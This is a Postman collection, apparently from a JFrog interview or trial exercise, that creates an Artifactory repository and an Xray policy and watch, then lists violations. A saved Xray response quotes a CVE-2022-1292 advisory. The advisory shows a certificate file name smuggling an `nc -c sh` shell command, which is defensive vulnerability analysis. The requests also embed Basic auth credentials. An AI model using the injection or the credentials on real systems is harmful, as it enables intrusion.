{
	"info": {
		"_postman_id": "16c6bf8f-81f3-4682-89be-9fa2cd4b7ff5",
		"name": "JFrog",
		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
		"_exporter_id": "25520774"
	},
	"item": [
		{
			"name": "1. Create repository",
			"request": {
				"auth": {
					"type": "basic",
					"basic": [
						{
							"key": "password",
							"value": "{{password}}",
							"type": "string"
						},
						{
							"key": "username",
							"value": "{{username}}",
							"type": "string"
						}
					]
				},
				"method": "PUT",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Authorization",
						"value": "Basic bGVhZDpQYXNzd29yZDEh"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n    \"key\": \"docker-local\",\n    \"projectKey\": \"\",\n    \"packageType\": \"docker\",\n    \"rclass\": \"local\",\n    \"xrayIndex\": true\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{hostname}}/artifactory/api/repositories/docker-local",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"artifactory",
						"api",
						"repositories",
						"docker-local"
					]
				},
				"description": "Generated from cURL: curl --location --request PUT\n'https://jfsinterview.jfrog.io/artifactory/api/repositories/docker-local' \\\n--header 'Content-Type: application/json' \\\n--header 'Authorization: Basic bGVhZDpQYXNzd29yZDEh' \\\n--data '{\n\"key\": \"docker-local\"\n,\n\"projectKey\": \"\"\n,\n\"packageType\": \"docker\"\n,\n\"rclass\": \"local\"\n,\n\"xrayIndex\": true\n}'"
			},
			"response": [
				{
					"name": "200 OK",
					"originalRequest": {
						"method": "PUT",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Authorization",
								"value": "Basic bGVhZDpQYXNzd29yZDEh"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n    \"key\": \"docker-local\",\n    \"projectKey\": \"\",\n    \"packageType\": \"docker\",\n    \"rclass\": \"local\",\n    \"xrayIndex\": true\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{hostname}}/artifactory/api/repositories/docker-local",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"artifactory",
								"api",
								"repositories",
								"docker-local"
							]
						}
					},
					"status": "OK",
					"code": 200,
					"_postman_previewlanguage": "plain",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 10:53:18 GMT"
						},
						{
							"key": "Content-Type",
							"value": "text/plain"
						},
						{
							"key": "Transfer-Encoding",
							"value": "chunked"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "X-JFrog-Version",
							"value": "Artifactory/7.111.1 81101900"
						},
						{
							"key": "X-Artifactory-Id",
							"value": "435e90e3423a2d71615a2dc1d613f3383287c521"
						},
						{
							"key": "X-Artifactory-Node-Id",
							"value": "a0yluwjzcb37w-artifactory-primary-0"
						},
						{
							"key": "X-Request-ID",
							"value": "a1eca7578dfe3e64aa8eb7c052e6a598"
						}
					],
					"cookie": [],
					"body": "Successfully created repository 'docker-local' \n"
				}
			]
		},
		{
			"name": "2. Check repository",
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Authorization",
						"value": "Basic bGVhZDpQYXNzd29yZDEh"
					}
				],
				"url": {
					"raw": "{{hostname}}/artifactory/api/repositories",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"artifactory",
						"api",
						"repositories"
					]
				},
				"description": "Generated from cURL: curl --location 'https://jfsinterview.jfrog.io/artifactory/api/repositories' \\\n--header 'Content-Type: application/json' \\\n--header 'Authorization: Basic bGVhZDpQYXNzd29yZDEh' \\\n--d"
			},
			"response": [
				{
					"name": "200 OK",
					"originalRequest": {
						"method": "GET",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Authorization",
								"value": "Basic bGVhZDpQYXNzd29yZDEh"
							}
						],
						"url": {
							"raw": "{{hostname}}/artifactory/api/repositories",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"artifactory",
								"api",
								"repositories"
							]
						}
					},
					"status": "OK",
					"code": 200,
					"_postman_previewlanguage": "json",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 10:57:14 GMT"
						},
						{
							"key": "Content-Type",
							"value": "application/vnd.org.jfrog.artifactory.repositories.RepositoryDetailsList+json"
						},
						{
							"key": "Transfer-Encoding",
							"value": "chunked"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "X-JFrog-Version",
							"value": "Artifactory/7.111.1 81101900"
						},
						{
							"key": "X-Artifactory-Id",
							"value": "435e90e3423a2d71615a2dc1d613f3383287c521"
						},
						{
							"key": "X-Artifactory-Node-Id",
							"value": "a0yluwjzcb37w-artifactory-primary-0"
						},
						{
							"key": "Cache-Control",
							"value": "no-store"
						},
						{
							"key": "X-Request-ID",
							"value": "1d5b3429662fdb9f44708d0f44d83fa9"
						}
					],
					"cookie": [],
					"body": "[\n    {\n        \"key\": \"docker-local\",\n        \"description\": \"\",\n        \"type\": \"LOCAL\",\n        \"url\": \"https://automationhacks.jfrog.io/artifactory/docker-local\",\n        \"packageType\": \"Docker\"\n    }\n]"
				}
			]
		},
		{
			"name": "3. Create security policy",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Authorization",
						"value": "Basic YWRtaW51c2VyOlBhc3N3b3JkMSE="
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n    \"name\": \"sec_policy_1\",\n    \"description\": \"This is a specific CVEs security policy\",\n    \"type\": \"security\",\n    \"rules\": [\n        {\n            \"name\": \"some_rule\",\n            \"criteria\": {\n                \"malicious_package\": false,\n                \"fix_version_dependant\": false,\n                \"min_severity\": \"high\"\n            },\n            \"actions\": {\n                \"mails\": [],\n                \"webhooks\": [],\n                \"fail_build\": false,\n                \"block_release_bundle_distribution\": false,\n                \"block_release_bundle_promotion\": false,\n                \"notify_deployer\": false,\n                \"notify_watch_recipients\": false,\n                \"create_ticket_enabled\": false,\n                \"block_download\": {\n                    \"active\": false,\n                    \"unscanned\": false\n                }\n            },\n            \"priority\": 1\n        }\n    ]\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{hostname}}/xray/api/v2/policies",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"xray",
						"api",
						"v2",
						"policies"
					]
				},
				"description": "Generated from cURL: curl --location 'https://mytraial001.jfrog.io/xray/api/v2/policies' \\\n--header 'Content-Type: application/json' \\\n--header 'Authorization: Basic YWRtaW51c2VyOlBhc3N3b3JkMSE=\n' \\\n--data '{\n\"name\": \"sec_policy_1\"\n,\n\"description\": \"This is a specific CVEs security policy\"\n,\n\"type\": \"security\"\n,\n\"rules\": [\n{\n\"name\": \"some_rule\"\n,\n\"criteria\": {\n\"malicious_package\": false,\n\"fix_version_dependant\": false,\n\"min_severity\": \"high\"\n},\n\"actions\": {\n\"mails\": [],\n\"webhooks\": [],\n\"fail_build\": false,\n\"block_release_bundle_distribution\": false,\n\"block_release_bundle_promotion\": false,\n\"notify_deployer\": false,\n\"notify_watch_recipients\": false,\n\"create_ticket_enabled\": false,\n\"block_download\": {\n\"active\": false,\n\"unscanned\": false\n}\n},\n\"priority\": 1\n}\n]\n}'"
			},
			"response": [
				{
					"name": "201 Created",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Authorization",
								"value": "Basic YWRtaW51c2VyOlBhc3N3b3JkMSE="
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n    \"name\": \"sec_policy_1\",\n    \"description\": \"This is a specific CVEs security policy\",\n    \"type\": \"security\",\n    \"rules\": [\n        {\n            \"name\": \"some_rule\",\n            \"criteria\": {\n                \"malicious_package\": false,\n                \"fix_version_dependant\": false,\n                \"min_severity\": \"high\"\n            },\n            \"actions\": {\n                \"mails\": [],\n                \"webhooks\": [],\n                \"fail_build\": false,\n                \"block_release_bundle_distribution\": false,\n                \"block_release_bundle_promotion\": false,\n                \"notify_deployer\": false,\n                \"notify_watch_recipients\": false,\n                \"create_ticket_enabled\": false,\n                \"block_download\": {\n                    \"active\": false,\n                    \"unscanned\": false\n                }\n            },\n            \"priority\": 1\n        }\n    ]\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{hostname}}/xray/api/v2/policies",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"xray",
								"api",
								"v2",
								"policies"
							]
						}
					},
					"status": "Created",
					"code": 201,
					"_postman_previewlanguage": "json",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 11:05:46 GMT"
						},
						{
							"key": "Content-Type",
							"value": "application/json"
						},
						{
							"key": "Content-Length",
							"value": "38"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "Content-Security-Policy",
							"value": "default-src https: 'unsafe-inline' 'unsafe-eval'; font-src https: data:; img-src http: https: data:"
						},
						{
							"key": "Strict-Transport-Security",
							"value": "max-age=31536000"
						},
						{
							"key": "X-Request-ID",
							"value": "c351bb41be69f0a21db4d684d85a7d3c"
						}
					],
					"cookie": [],
					"body": "{\n    \"info\": \"Policy created successfully\"\n}"
				}
			]
		},
		{
			"name": "4. Create watch",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Authorization",
						"value": "Basic bGVhZDpQYXNzd29yZDEh"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n    \"general_data\": {\n        \"name\": \"example1-watch\",\n        \"description\": \"This is an example watch #1\",\n        \"active\": true\n    },\n    \"project_resources\": {\n        \"resources\": [\n            {\n                \"type\": \"repository\",\n                \"bin_mgr_id\": \"default\",\n                \"name\": \"docker-local\",\n                \"filters\": [\n                    {\n                        \"type\": \"regex\",\n                        \"value\": \".*\"\n                    }\n                ]\n            }\n        ]\n    },\n    \"assigned_policies\": [\n        {\n            \"name\": \"sec_policy_1\",\n            \"type\": \"security\"\n        }\n    ]\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{hostname}}/xray/api/v2/watches",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"xray",
						"api",
						"v2",
						"watches"
					]
				},
				"description": "Generated from cURL: curl --location 'https://jfsinterview.jfrog.io/xray/api/v2/watches' \\\n--header 'Content-Type: application/json' \\\n--header 'Authorization: Basic bGVhZDpQYXNzd29yZDEh' \\\n--data '{\n\"general_data\": {\n\"name\": \"example1-watch\"\n,\n\"description\": \"This is an example watch #1\"\n,\n\"active\": true\n},\n\"project_resources\": {\n\"resources\": [\n{\n\"type\": \"repository\"\n,\n\"bin_mgr_id\": \"default\"\n,\n\"name\": \"docker-local\"\n,\n\"filters\": [\n{\n\"type\": \"regex\"\n,\n\"value\": \"\n.\n*\"\n}\n]\n}\n]\n},\n\"assigned_policies\": [\n{\n\"name\": \"sec_policy_1\"\n,\n\"type\": \"security\"\n}\n]"
			},
			"response": [
				{
					"name": "201 Created",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Authorization",
								"value": "Basic bGVhZDpQYXNzd29yZDEh"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n    \"general_data\": {\n        \"name\": \"example1-watch\",\n        \"description\": \"This is an example watch #1\",\n        \"active\": true\n    },\n    \"project_resources\": {\n        \"resources\": [\n            {\n                \"type\": \"repository\",\n                \"bin_mgr_id\": \"default\",\n                \"name\": \"docker-local\",\n                \"filters\": [\n                    {\n                        \"type\": \"regex\",\n                        \"value\": \".*\"\n                    }\n                ]\n            }\n        ]\n    },\n    \"assigned_policies\": [\n        {\n            \"name\": \"sec_policy_1\",\n            \"type\": \"security\"\n        }\n    ]\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{hostname}}/xray/api/v2/watches",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"xray",
								"api",
								"v2",
								"watches"
							]
						}
					},
					"status": "Created",
					"code": 201,
					"_postman_previewlanguage": "json",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 11:08:48 GMT"
						},
						{
							"key": "Content-Type",
							"value": "application/json"
						},
						{
							"key": "Content-Length",
							"value": "46"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "Content-Security-Policy",
							"value": "default-src https: 'unsafe-inline' 'unsafe-eval'; font-src https: data:; img-src http: https: data:"
						},
						{
							"key": "Strict-Transport-Security",
							"value": "max-age=31536000"
						},
						{
							"key": "X-Request-ID",
							"value": "97d140d050119dde0d13aa43fee2c9e5"
						}
					],
					"cookie": [],
					"body": "{\n    \"info\": \"Watch has been successfully created\"\n}"
				}
			]
		},
		{
			"name": "5. Apply watch on existing content",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Authorization",
						"value": "Basic YWRtaW46cGFzc3dvcmQ="
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n    \"watch_names\": [\n        \"example1-watch\"\n    ],\n    \"date_range\": {\n        \"start_date\": \"2025-04-09T10:25:00+02:00\",\n        \"end_date\": \"2025-04-19T10:30:00+02:00\"\n    }\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{hostname}}/xray/api/v1/applyWatch",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"xray",
						"api",
						"v1",
						"applyWatch"
					]
				},
				"description": "Generated from cURL: curl --location 'https://xray-dev.jfrogdev.org/xray/api/v1/applyWatch' \\\n--header 'Content-Type: application/json' \\\n--header 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=\n' \\\n--data '{\n\"watch_names\":[\n\"amit-watch-3.117\"\n],\n{\n\"date_range\":\n\"start_date\": \"2025-04-07T10:25:00+02:00\"\n, //UTC time in RFC3339\nformatYYYY-MM-DDTHH:MM:SSZ\n\"end_date\": \"2025-04-07T10:30:00+02:00\" // UTC time in RFC3339\nformatYYYY-MM-DDTHH:MM:SSZ\n}\n}'"
			},
			"response": [
				{
					"name": "202 Accepted",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Authorization",
								"value": "Basic YWRtaW46cGFzc3dvcmQ="
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n    \"watch_names\": [\n        \"example1-watch\"\n    ],\n    \"date_range\": {\n        \"start_date\": \"2025-04-09T10:25:00+02:00\",\n        \"end_date\": \"2025-04-19T10:30:00+02:00\"\n    }\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{hostname}}/xray/api/v1/applyWatch",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"xray",
								"api",
								"v1",
								"applyWatch"
							]
						}
					},
					"status": "Accepted",
					"code": 202,
					"_postman_previewlanguage": "json",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 11:12:32 GMT"
						},
						{
							"key": "Content-Type",
							"value": "application/json"
						},
						{
							"key": "Content-Length",
							"value": "38"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "Content-Security-Policy",
							"value": "default-src https: 'unsafe-inline' 'unsafe-eval'; font-src https: data:; img-src http: https: data:"
						},
						{
							"key": "Strict-Transport-Security",
							"value": "max-age=31536000"
						}
					],
					"cookie": [],
					"body": "{\n    \"info\": \"History Scan is in progress\"\n}"
				}
			]
		},
		{
			"name": "6. Check Xray scan status",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Authorization",
						"value": "Basic bGVhZDpQYXNzd29yZDEh"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n    \"repo\": \"docker-local\",\n    \"path\": \"alpine3.9/latest/manifest.json\"\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{hostname}}/xray/api/v1/artifact/status",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"xray",
						"api",
						"v1",
						"artifact",
						"status"
					]
				},
				"description": "Generated from cURL: curl --location 'https://jfsinterview.jfrog.io/xray/api/v1/artifact/status' \\\n--header 'Content-Type: application/json' \\\n--header 'Authorization: Basic bGVhZDpQYXNzd29yZDEh' \\\n--data '{\n\"repo\": \"docker-local\"\n,\n\"p"
			},
			"response": [
				{
					"name": "200 OK",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Authorization",
								"value": "Basic bGVhZDpQYXNzd29yZDEh"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n    \"repo\": \"docker-local\",\n    \"path\": \"alpine3.9/latest/manifest.json\"\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{hostname}}/xray/api/v1/artifact/status",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"xray",
								"api",
								"v1",
								"artifact",
								"status"
							]
						}
					},
					"status": "OK",
					"code": 200,
					"_postman_previewlanguage": "json",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 11:21:44 GMT"
						},
						{
							"key": "Content-Type",
							"value": "application/json"
						},
						{
							"key": "Content-Length",
							"value": "574"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "Content-Security-Policy",
							"value": "default-src https: 'unsafe-inline' 'unsafe-eval'; font-src https: data:; img-src http: https: data:"
						},
						{
							"key": "Strict-Transport-Security",
							"value": "max-age=31536000"
						},
						{
							"key": "X-Request-ID",
							"value": "4ab09ed0bd8ff9190ddcf0d3cabe3604"
						}
					],
					"cookie": [],
					"body": "{\n    \"overall\": {\n        \"status\": \"DONE\",\n        \"time\": \"2025-04-09T11:12:34Z\"\n    },\n    \"details\": {\n        \"sca\": {\n            \"status\": \"DONE\",\n            \"time\": \"2025-04-09T11:12:33Z\"\n        },\n        \"contextual_analysis\": {\n            \"status\": \"DONE\",\n            \"time\": \"2025-04-09T11:05:03Z\"\n        },\n        \"exposures\": {\n            \"status\": \"DONE\",\n            \"time\": \"2025-04-09T11:05:03Z\",\n            \"categories\": {\n                \"iac\": {\n                    \"time\": \"2025-04-09T11:05:03Z\",\n                    \"status\": \"NOT_SUPPORTED\"\n                },\n                \"secrets\": {\n                    \"time\": \"2025-04-09T11:05:03Z\",\n                    \"status\": \"DONE\"\n                },\n                \"services\": {\n                    \"time\": \"2025-04-09T11:05:03Z\",\n                    \"status\": \"DONE\"\n                },\n                \"applications\": {\n                    \"time\": \"2025-04-09T11:05:03Z\",\n                    \"status\": \"DONE\"\n                }\n            }\n        },\n        \"violations\": {\n            \"status\": \"DONE\",\n            \"time\": \"2025-04-09T11:12:34Z\"\n        }\n    }\n}"
				}
			]
		},
		{
			"name": "7. Get violations",
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n    \"filters\": {\n        \"watch_name\": \"example1-watch\",\n        \"violation_type\": \"Security\",\n        \"min_severity\": \"High\",\n        \"resources\": {\n            \"artifacts\": [\n                {\n                    \"repo\": \"docker-local\",\n                    \"path\": \"alpine3.9/latest/manifest.json\"\n                }\n            ]\n        }\n    },\n    \"pagination\": {\n        \"order_by\": \"created\",\n        \"direction\": \"asc\",\n        \"limit\": 100,\n        \"offset\": 1\n    }\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{hostname}}/xray/api/v1/violations",
					"host": [
						"{{hostname}}"
					],
					"path": [
						"xray",
						"api",
						"v1",
						"violations"
					]
				},
				"description": "Generated from cURL: curl -X POST \"https://xray-dev.jfrogdev.org/xray/api/v1/violations\" \\\n-H \"Content-Type: application/json\" \\\n-d '{\n\"filters\": {\n\"watch_name\": \"<$WATCH_NAME>\"\n,\n\"violation_type\": \"Security\"\n,\n\"min_severity\": \"High\"\n,\n\"resources\": {\n\"artifacts\": [\n{\n\"repo\": \"${REPO_NAME}\"\n, //docker-local\n\"path\": \"${PATH_TO_ARTIFACT/IMAGE}\" //alpine/3.9/manifest.json\n}\n]\n}\n},\n\"pagination\": {\n\"order_by\": \"created\"\n,\n\"direction\": \"asc\"\n,\n\"limit\": 100,\n\"offset\": 1\n}\n}'"
			},
			"response": [
				{
					"name": "200 OK",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n    \"filters\": {\n        \"watch_name\": \"example1-watch\",\n        \"violation_type\": \"Security\",\n        \"min_severity\": \"High\",\n        \"resources\": {\n            \"artifacts\": [\n                {\n                    \"repo\": \"docker-local\",\n                    \"path\": \"alpine3.9/latest/manifest.json\"\n                }\n            ]\n        }\n    },\n    \"pagination\": {\n        \"order_by\": \"created\",\n        \"direction\": \"asc\",\n        \"limit\": 100,\n        \"offset\": 1\n    }\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{hostname}}/xray/api/v1/violations",
							"host": [
								"{{hostname}}"
							],
							"path": [
								"xray",
								"api",
								"v1",
								"violations"
							]
						}
					},
					"status": "OK",
					"code": 200,
					"_postman_previewlanguage": "json",
					"header": [
						{
							"key": "Date",
							"value": "Wed, 09 Apr 2025 11:15:28 GMT"
						},
						{
							"key": "Content-Type",
							"value": "application/json"
						},
						{
							"key": "Transfer-Encoding",
							"value": "chunked"
						},
						{
							"key": "Connection",
							"value": "keep-alive"
						},
						{
							"key": "Content-Security-Policy",
							"value": "default-src https: 'unsafe-inline' 'unsafe-eval'; font-src https: data:; img-src http: https: data:"
						},
						{
							"key": "Strict-Transport-Security",
							"value": "max-age=31536000"
						},
						{
							"key": "X-Request-ID",
							"value": "baca364c9cd9589c236ffb6c36298819"
						}
					],
					"cookie": [],
					"body": "{\n    \"total_violations\": 35,\n    \"violations\": [\n        {\n            \"description\": \"The c_rehash script does not properly sanitise shell metacharacters to prevent command injection. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.3 (Affected 3.0.0,3.0.1,3.0.2). Fixed in OpenSSL 1.1.1o (Affected 1.1.1-1.1.1n). Fixed in OpenSSL 1.0.2ze (Affected 1.0.2-1.0.2zd).\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-209584\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-209584&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"Improper filename validation in `c_rehash` can lead to arbitrary code execution.\",\n                \"full_description\": \"[c_rehash](https://www.openssl.org/docs/man3.0/man1/c_rehash.html) is a script, part of the OpenSSL package, which is used to create symbolic links to certificate files. The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\\n\\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\\n\\nExample: \\n\\n1. Create the certificate file with a name containing the payload:\\n\\n```\\necho \\\"-----BEGIN CERTIFICATE-----\\\" > \\\"hey.crt\\\\`nc -c sh 127.0.0.1 12345\\\\`\\\"\\n```\\n\\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\\n\\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\\n\\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The likelihood of an attacker being able to write certificates in one of the paths that are monitored by `c_rehash` or `update-ca-certificates` is very low. For a system to be vulnerable to this CVE, there must be an applicative way to upload or rename certificate files to the system or a filesystem permissions misconfiguration that allows a non-root user on the machine to write to these paths.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"For exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue is trivial to exploit and does not require a published writeup or PoC\",\n                        \"description\": \"If the applicability conditions exist, it is trivial to craft a payload in a command line injected in a certificate filename.\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue results in a severe impact (such as remote code execution)\",\n                        \"description\": \"Exploiting this vulnerability leads to code execution.\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue has a detailed technical explanation published, that can aid in exploit development\",\n                        \"is_positive\": false\n                    }\n                ]\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-1292\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable string 'c_rehash' was not found in the image\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-1292\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable string 'c_rehash' was not found in the image\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-1292\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-1292\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"crypto/rsa/rsa_gen.c in OpenSSL before 0.9.6 mishandles C bitwise-shift operations that exceed the size of an expression, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by leveraging improper RSA key generation on 64-bit HP-UX platforms.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-523654\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-523654&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2000-1254\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"An invalid pointer dereference on read can be triggered when an\\napplication tries to load malformed PKCS7 data with the\\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\\n\\nThe result of the dereference is an application crash which could\\nlead to a denial of service attack. The TLS implementation in OpenSSL\\ndoes not call this function however third party applications might\\ncall these functions on untrusted data.\",\n            